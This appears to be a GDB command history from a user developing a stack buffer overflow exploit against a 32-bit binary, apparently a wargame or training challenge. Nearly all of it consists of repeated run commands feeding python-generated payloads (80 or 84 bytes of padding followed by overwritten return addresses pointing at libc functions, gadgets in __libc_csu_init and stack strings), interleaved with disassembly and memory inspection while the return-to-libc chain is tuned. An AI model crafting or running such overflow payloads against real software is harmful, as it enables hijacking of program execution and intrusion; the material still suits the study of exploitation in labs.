c
checksec 
q
clear
r `python -c 'print "A"*84+"\x70\x8d\x04\x08"+"BBBB"+"\xe8\xaf\x0a\x08"+"\xf3\xfa\xff\xbf"'`
b main
r `python -c 'print "A"*84+"\x70\x8d\x04\x08"+"BBBB"+"\xe8\xaf\x0a\x08"+"\xf3\xfa\xff\xbf"'`
p printf
r `python -c 'print "A"*84+"\x80\x0d\xeb\xb7"+"BBBB"+"\xe8\xaf\x0a\x08"+"\xf3\xfa\xff\xbf"'`
c
#r `python -c 'print "A"*84+"\x80\x0d\xeb\xb7"+"BBBB"+"\xe8\xaf\x0a\x08"+"\xf3\xfa\xff\xbf"'`
x/s 0x080aafe8
r `python -c 'print "A"*84+"\x80\x0d\xeb\xb7"+"BBBB"+"\xe8\xaf\x0a\x08"+"\xf3\xfa\xff\xbf"'`
disas main 
b *0x080484ad
c
dumpargs 0x080484ad
r `python -c 'print "A"*84+"\x80\x0d\xeb\xb7"+"BBBB"+"\x50\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
c
c
q
disas main 
#
#8048527:
#8048527
r `python -c 'print "A"*84+"\x27\x85\x04\x08"+"\x80\x0d\xeb\xb7"+"BBBB"+"\x50\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
b main
r `python -c 'print "A"*84+"\x27\x85\x04\x08"+"\x80\x0d\xeb\xb7"+"BBBB"+"\x50\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
disas main 
s
disas main 
s
q
clear
disas main 
q
disas main 
b *0x08048488
r `python -c 'print "A"*84+"\x27\x85\x04\x08"+"\x80\x0d\xeb\xb7"+"BBBB"+"\x50\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
p printf
r `python -c 'print "A"*84+"\x27\x85\x04\x08"+"\x80\x0b\xeb\xb7"+"BBBB"+"\x50\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x50\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
x/s 0xbffff8b0
x/x 0xbffff8b0
x/3x 0xbffff8b0
x/7x 0xbffff8b0
x/x 0x8048550
x/s 0x8048550
x/s 0x8048551
x/s 0x8048554
x/s 0x8048556
x/s 0x8048558
x/10s 0x8048558
x/30s 0x8048558
x/100s 0x8048558
x/100s 0x8048500
x/100s 0x8048550
disas main 
x/s 0x8048520,
x/s 0x8048520
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBBCCCC"+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"+"BBBB"*4'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"CCCC\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"CCCC\x58\xf8\xff\xbf"'`
x/5xw $esp-5
#8048527:
#r `python -c 'print "A"*76+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"CCCC\x58\xf8\xff\xbf"'`
8048526:
#r `python -c 'print "A"*76+"\x80\x0b\xeb\xb7"+"\x80\x0b\x04\x08"+"BBBB"+"\x20\x85\x04\x08"+"CCCC\x58\xf8\xff\xbf"'`
#r `python -c 'print "A"*76+"\x80\x0b\xeb\xb7"+"BBBB"+"\x26\x85\x04\x08"+"BBBB"+"\x20\x85\x04\x08"+"CCCC\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
q
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
q
disas main 
b *0x08048488
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x68"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"BBBB"+"\x20\x85\x04\x08CCCC"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"+"\x20\x85\x04\x08CCCC"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
ls
clear
ls
q
disas main
b *0x08048488
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"*2+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11\x12"+"\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x12\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x20\x20\x20\x20\x20\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11\x30\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"+"\x58\xf8\xff\xbf"'`
#r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"+"\x58\xf8\xff\xbf"'`
x/s 0xbffff858
x/s 0xbffff857
x/s 0xbffff854
x/s 0xbffff850
x/s 0xbffff84a
x/10s 0xbffff84a
x/10s 0xbffff84f
x/10s 0xbffff850
x/10s 0xbffff851
x/10s 0xbffff850
x/10s 0xbffff830
x/10s 0xbffff820
x/10s 0xbffff821
clear
disas main 
b *0x0804847d
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"+"\x58\xf8\xff\xbf"'`
dumpargs 0x0804847d
x/x 0xbffff858
x/x 0xbffff857
x/x 0xbffff858
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x11\x11\x11\x11"+"\x58\xf8\xff\xbf"'`
c
c
p exit 
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x79\x62\xe9\xb7"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x58\xf8\xff\xbf"'`
c
c
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x58\xf8\xff\xbf"'`
q
#8048528:
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x28\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
disas main 
b *0x08048488
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x28\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
x/20xw libc_su_init
x/20xw __libc_su_init
x/20xw _libc_su_init
x/20xw __libc_csu_init 
x/20i __libc_csu_init 
x/50i __libc_csu_init 
#0x80484f8
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
c
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
s
s
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
c
#r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
b *0x080484f8
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
x/50i __libc_csu_init 
print printf
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf8\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
c
c
c
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
#r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
x/x 0xbffff858
x/s 0xbffff858
x/10s 0xbffff858
x/30s 0xbffff858
disas main 
delete breakpoints 
b *0x0804847d
#r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
dumpargs 0x0804847d
x/x 0xbffff858
x/x 0xbffff857
x/x 0xbffff858
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
q
x/i 0xbffff9a2
x/i 0xbffff9a0
clear
q
disas main 
b *0x08048488
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\xf7\x84\x04\x08"+"\x58\xf8\xff\xbf"'`
x/
x/w $esp-1
x/w $esp-2
x/w $esp-4
x/4i 0x80484f7
s
s
s
q
b main
r
x/4i _fini 
x/10i _fini 
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\x15\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
c
x/5i 0x8048515
b main
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\x15\x85\x04\x08"+"\x58\xf8\xff\xbf"'`
disas __libc_stack_end 
disas __libc_system
disas __libc_siglongjmp 
disas __libc_sa_len 
disas __libc_clntudp_bufcreate 
searchmem esp
disas __libc_fork 
disas __libc_free
disas __libc_realloc 
disas __libc_pwrite 
disas __libc_pvalloc 
disas __libc_allocate_rtsig
disas __libc_start_main
disas __libc_enable_secure 
disas __libc_mallinfo 
disas __libc_msgrcv 
searchmem ret
disas getline 
disas getpgid 
disas getpas
disas getpass
disas getpagesize 
disas __memset_gg 
disas __mbrlen 
disas main 
disas getpgid 
disas getpas
disas __libc_msgrcv 
disas __libc_csu_init 
disas __libc_csu_fini 
x/4i  __libc_csu_fini 
x/4xw  __libc_csu_fini 
x/2b 0x08048491
q
b main
r
disas __libc_fatal 
disas __libc_mallopt 
disas argv 
disas access 
disas fgetgrent
disas fgetpos64
disas key_decryptsession
disas key_decryptsession_
disas key_decryptsession_pk 
disas bind
disas bindresvport 
disas qsort
disas qgcvt 
disas abort 
disas llseek 
